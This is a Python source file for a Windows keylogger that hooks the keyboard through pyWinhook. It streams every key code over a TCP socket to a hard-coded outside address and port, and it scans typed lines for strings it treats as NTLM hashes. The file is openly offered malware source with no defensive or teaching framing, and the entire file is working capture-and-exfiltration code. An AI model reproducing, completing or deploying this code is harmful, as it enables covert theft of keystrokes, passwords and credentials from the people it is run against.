import socket
import pythoncom
import pyWinhook as pyhook
import re


class PolymorphicKeylogger:
    def __init__(self):
        self.current_line = []  # Stores the characters of the current line
        self.server_socket = None

    def extract_ntlm_hashes(self, text):
        # Regular expression pattern to match NTLM hashes
        pattern = r"[0-9A-Fa-f]{32}"

        # Find all matches of the pattern in the text
        matches = re.findall(pattern, text)

        # Return the list of NTLM hashes
        return matches

    def on_keyboard_event(self, event):
        if event.KeyID > 0:
            key_code = str(event.KeyID).encode()
            self.server_socket.sendall(key_code)

            # Convert the key code to a character
            key = chr(event.KeyID)

            # Append the pressed key to the current line
            self.current_line.append(key)

            # Check if Enter key is pressed
            if event.KeyID == 13:
                # Convert the current line to a string
                line = "".join(self.current_line)

                # Extract NTLM hashes from the line
                hashes = self.extract_ntlm_hashes(line)

                # Print the NTLM hashes
                if hashes:
                    print("Found NTLM Hashes:", hashes)

                # Clear the current line
                self.current_line.clear()

        return True

    def start(self):
        # Create a hook manager
        hook_manager = pyhook.HookManager()

        # Open a socket connection
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_address = ('142.10.10.2', 7777)
        self.server_socket.connect(server_address)

        # Register the keyboard event handler
        hook_manager.KeyDown = self.on_keyboard_event

        # Hook the keyboard events
        hook_manager.HookKeyboard()

        # Start the message loop to receive events
        pythoncom.PumpMessages()


class CustomKeylogger(PolymorphicKeylogger):
    def extract_ntlm_hashes(self, text):
        # Custom implementation to extract NTLM hashes
        # Replace this method with your own logic
        print("Custom implementation for extracting NTLM hashes")

        # Return an empty list as a placeholder
        return []


def main():
    keylogger = CustomKeylogger()
    keylogger.start()


if __name__ == "__main__":
    main()